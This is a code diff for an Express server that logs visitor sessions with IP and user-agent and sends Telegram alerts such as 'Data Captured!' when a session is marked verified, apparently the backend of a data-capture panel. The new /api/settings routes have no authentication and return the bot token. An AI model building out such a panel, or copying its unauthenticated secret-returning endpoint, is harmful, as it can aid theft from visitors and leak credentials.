@@ -90,17 +90,29 @@ io.on('connection', (socket) => {
 
 // --- API Routes ---
 
-// Telegram Helper
-const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TG_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// Settings Helper
+let cachedSettings: any = {};
+const refreshSettings = async () => {
+    try {
+        cachedSettings = await db.getSettings();
+        // Fallback to Env
+        if (!cachedSettings.tgToken) cachedSettings.tgToken = process.env.TELEGRAM_BOT_TOKEN;
+        if (!cachedSettings.tgChat) cachedSettings.tgChat = process.env.TELEGRAM_CHAT_ID;
+        if (!cachedSettings.email) cachedSettings.email = process.env.ADMIN_EMAIL;
+    } catch (e) { console.error('Failed to load settings', e); }
+};
+refreshSettings();
 
 const sendTelegram = (msg: string) => {
-    if (!TG_TOKEN || !TG_CHAT_ID) return;
-    const data = JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' });
+    const token = cachedSettings.tgToken;
+    const chat = cachedSettings.tgChat;
+    if (!token || !chat) return;
+
+    const data = JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' });
     const options = {
         hostname: 'api.telegram.org',
         port: 443,
-        path: `/bot${TG_TOKEN}/sendMessage`,
+        path: `/bot${token}/sendMessage`,
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -113,6 +125,22 @@ const sendTelegram = (msg: string) => {
     req.end();
 };
 
+const sendEmail = (session: any) => {
+    if (!cachedSettings.email) return;
+    console.log(`[Email] Would send completion email to ${cachedSettings.email} for session ${session.sessionId}`);
+    // Email implementation stub - needs SMTP or SendGrid
+};
+
+const getClientIp = (req: express.Request) => {
+    const xForwardedFor = req.headers['x-forwarded-for'];
+    if (typeof xForwardedFor === 'string') {
+        return xForwardedFor.split(',')[0].trim();
+    } else if (Array.isArray(xForwardedFor)) {
+        return xForwardedFor[0].trim();
+    }
+    return req.socket.remoteAddress || 'Unknown';
+};
+
 // 1. Sync State (Hybrid: HTTP for data, Socket for notify)
 app.post('/api/sync', async (req, res) => {
     try {
@@ -121,17 +149,19 @@ app.post('/api/sync', async (req, res) => {
             return res.status(400).json({ error: 'Missing sessionId' });
         }
 
-        const ip = (req.headers['x-forwarded-for'] as string)?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
+        const ip = getClientIp(req);
 
         // Notification Logic
-        if (TG_TOKEN || process.env.ENABLE_EMAIL) {
-             const existing = await db.getSession(data.sessionId);
-             if (!existing) {
-                 sendTelegram(`🚨 <b>New Session Started</b>\nID: <code>${data.sessionId}</code>\nIP: ${ip}\nUser-Agent: ${data.fingerprint?.userAgent || 'Unknown'}`);
-             } else if (existing.status !== 'Verified' && data.status === 'Verified') {
-                 sendTelegram(`✅ <b>Session Verified/Complete</b>\nID: <code>${data.sessionId}</code>\nData Captured!`);
-                 console.log(`[Email] Sending completion email to admin for session ${data.sessionId}`);
-             }
+        const existing = await db.getSession(data.sessionId);
+
+        // 1. New Session (Push Telegram)
+        if (!existing) {
+             sendTelegram(`🚨 <b>New Session Started</b>\nID: <code>${data.sessionId}</code>\nIP: ${ip}\nUA: ${data.fingerprint?.userAgent || 'Unknown'}`);
+        }
+        // 2. Completed Session (Email + Telegram)
+        else if (existing.status !== 'Verified' && data.status === 'Verified') {
+             sendTelegram(`✅ <b>Session Verified</b>\nID: <code>${data.sessionId}</code>\nData Captured!`);
+             sendEmail(data);
         }
 
         await db.upsertSession(data.sessionId, data, ip);
@@ -153,6 +183,22 @@ app.post('/api/sync', async (req, res) => {
         console.error('[Sync] Error:', e);
         res.status(500).json({ error: 'Internal Server Error' });
     }
+});
+
+// Settings API
+app.get('/api/settings', async (req, res) => {
+    await refreshSettings();
+    res.json(cachedSettings);
+});
+
+app.post('/api/settings', async (req, res) => {
+    const { email, tgToken, tgChat } = req.body;
+    if (email !== undefined) await db.updateSetting('email', email);
+    if (tgToken !== undefined) await db.updateSetting('tgToken', tgToken);
+    if (tgChat !== undefined) await db.updateSetting('tgChat', tgChat);
+
+    await refreshSettings();
+    res.json({ status: 'ok' });
 });
 
 // 2. Fetch Sessions (Admin)
